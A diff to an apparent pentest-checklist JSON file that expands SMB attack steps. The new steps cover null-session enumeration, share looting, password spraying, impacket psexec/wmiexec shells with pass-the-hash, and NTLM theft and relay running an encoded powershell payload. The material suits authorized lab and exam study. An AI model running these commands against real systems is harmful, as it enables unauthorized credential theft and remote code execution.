@@ -3,27 +3,61 @@
   "port": 445,
   "tasks": [
     {
-      "id": "smb_1",
-      "title": "Null Session & Guest Access Check",
+      "id": "smb_null_guest",
+      "title": "Null & Guest Session Enumeration",
+      "description": "Attempt to list shares using blank credentials or the guest account.",
       "commands": [
-        "netexec smb {target_ip} -u '' -p ''",
-        "netexec smb {target_ip} -u 'guest' -p '' --shares",
-        "smbclient -L //{target_ip}/ -N"
+        "smbclient -L \\\\\\\\{target_ip}\\\\ -U '%'",
+        "smbclient -L \\\\\\\\{target_ip}\\\\ -U 'guest'%",
+        "smbclient -L \\\\\\\\{target_ip}\\\\ -N"
       ]
     },
     {
-      "id": "smb_2",
-      "title": "Enumerate Shares & Permissions",
+      "id": "smb_enum_tools",
+      "title": "Automated Share & User Enumeration",
+      "description": "Run standard enumeration tools to map out shares, permissions, and domain details.",
       "commands": [
+        "enum4linux -a {target_ip}",
         "smbmap -H {target_ip}",
-        "enum4linux-ng -A {target_ip}"
+        "netexec smb {target_ip} --shares --verbose"
       ]
     },
     {
-      "id": "smb_3",
-      "title": "Vulnerability Scanning (MS17-010 / EternalBlue)",
+      "id": "smb_connect_loot",
+      "title": "Connect & Loot Shares",
+      "description": "Connect to a specific accessible share. Use 'get' to download files and 'put' to test upload permissions.",
       "commands": [
-        "nmap -p 445 --script smb-vuln* {target_ip}"
+        "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '%'",
+        "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '<Domain>\\\\<user>' --password '<password>'"
+      ]
+    },
+    {
+      "id": "smb_password_spray",
+      "title": "Password Spraying & Brute-Force",
+      "description": "Use CrackMapExec or NetExec to spray user lists and custom wordlists.",
+      "commands": [
+        "crackmapexec smb {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success",
+        "netexec smb {target_ip} -u users.txt -p rockyou.txt --local-auth"
+      ]
+    },
+    {
+      "id": "smb_impacket_exec",
+      "title": "Impacket Command Execution",
+      "description": "If you have administrative credentials or NTLM hashes, execute commands or get an interactive SYSTEM shell.",
+      "commands": [
+        "impacket-psexec <user>:'<password>'@{target_ip}",
+        "impacket-wmiexec -hashes 00000000000000000000000000000000:<NTHash> <user>@{target_ip}",
+        "impacket-smbexec <user>:'<password>'@{target_ip}"
+      ]
+    },
+    {
+      "id": "smb_ntlm_relay",
+      "title": "NTLM Relaying & Theft",
+      "description": "Generate a malicious payload with ntlm_theft, upload it to a writable share, and catch the hash with Responder or relay it.",
+      "commands": [
+        "python3 ntlm_theft.py --generate all --server <Kali_IP> --f test",
+        "sudo responder -I tun0",
+        "impacket-ntlmrelayx --no-http-server -smb2support -t {target_ip} -c \"powershell -enc <base64_payload>\""
       ]
     }
   ]
